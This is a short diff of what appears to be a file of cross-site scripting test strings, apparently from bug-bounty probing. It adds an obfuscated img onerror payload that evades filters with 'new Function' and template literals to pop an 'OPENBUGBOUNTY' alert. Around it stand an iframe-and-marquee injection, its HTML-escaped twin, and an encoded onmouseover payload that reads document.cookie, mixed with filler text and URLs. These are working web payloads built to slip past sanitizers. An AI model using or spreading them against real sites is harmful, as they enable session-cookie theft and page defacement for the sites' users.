@@ -23,6 +23,7 @@ i
 dsgsdfgg
 <iframe src="https:///google.com/;"></iframe><marquee><h1>Xsy by xss</h1></marquee>
 &lt;iframe src=&quot;https&#58;&#47;&#47;google&#46;com&#47;&#59;&quot;&gt;&lt;&#47;iframe&gt;&lt;marquee&gt;&lt;h1&gt;Xsy by xss&lt;&#47;h1&gt;&lt;&#47;marquee&gt;
+<img/src=q onerror='new Function`al\ert\`OPENBUGBOUNTY\``'>
 “><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
 https://fb.com
 http://youtube.com/
